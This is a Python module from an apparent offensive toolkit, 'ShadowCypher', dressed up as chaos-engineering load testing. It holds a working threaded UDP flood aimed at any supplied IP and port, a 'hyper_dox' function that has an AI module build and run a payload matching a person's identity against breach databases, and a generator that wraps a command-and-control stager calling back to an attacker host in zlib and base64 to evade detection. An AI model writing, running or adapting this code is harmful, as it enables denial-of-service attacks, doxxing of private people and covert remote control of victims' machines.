"""
ShadowCypher Chaos Engineering — Network Stress Testing & Load Orchestration.
Supports: UDP_FLUX, HTTP_SYN_FLOOD, ICMP_BURST.
"""

import os
import socket
import random
import threading
import time
import logging
from shadowcypher.core.logger import logger
from shadowcypher.core.stealth import require_stealth

class ChaosOrchestrator:
    def __init__(self):
        self.active = False
        self._threads = []

    def start_udp_flood(self, target_ip, target_port, duration=60, threads=10, on_output=None):
        """Orchestrate a UDP Load test with packet jitter."""
        require_stealth(on_output=on_output)
        self.active = True
        logger.info("chaos", f"LOAD_TEST: Initiating UDP volumetric test on {target_ip}:{target_port}")
        
        def flood():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time and self.active:
                try:
                    data = os.urandom(random.randint(512, 1400)) # Packet size variance
                    s.sendto(data, (target_ip, target_port))
                    if random.random() < 0.05:
                        time.sleep(0.01) # Jitter
                except Exception:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            self._threads.append(t)

    def asset_correlation(self, identity, on_output=None):
        """AI-Driven personality profiling and asset correlation."""
        from shadowcypher.modules.deephat import deephat
        
        desc = f"Deep-correlate identity {identity}. Cross-reference with known breach databases. Output risk matrix."
        if on_output: on_output(f"[OSINT] CORRELATING_ASSETS: Synthesizing data profile for {identity}...\n")
        
        filename = deephat.forge_weapon(desc, category="asset_correlation")
        return deephat.execute_payload(filename, on_output=on_output)

    def generate_encoded_stager(self, lhost, lport, on_output=None):
        """Generate a Python stager wrapped in zlib and base64 encoding."""
        import zlib, base64
        from shadowcypher.modules.payload_factory import PayloadFactory
        if on_output: on_output("[PAYLOAD] GENERATING_ENCODED_STAGER...\n")
        
        path = PayloadFactory.generate_stealth_c2_python(lhost, lport)
        with open(path, "rb") as f:
            original = f.read()
            
        # Recursive encoding wrapper
        b64_data = base64.b64encode(zlib.compress(original)).decode()
        wrapper = f"import zlib,base64; exec(zlib.decompress(base64.b64decode('{b64_data}')))"
        
        encoded_path = path.replace(".py", "_encoded.py")
        with open(encoded_path, "w") as f:
            f.write(wrapper)
            
        if on_output: on_output(f"[SUCCESS] STAGER_GENERATED: {encoded_path}\n")
        return encoded_path

    # Keep legacy function names mapping for backwards compatibility if needed
    def hyper_dox(self, identity, on_output=None):
        return self.asset_correlation(identity, on_output)

    def mutating_payload_forge(self, lhost, lport, on_output=None):
        return self.generate_encoded_stager(lhost, lport, on_output)

    def stop(self):
        self.active = False
        self._threads = []
        logger.info("chaos", "LOAD_TEST_HALTED: All flood threads terminated.")

# Global Instance
chaos = ChaosOrchestrator()
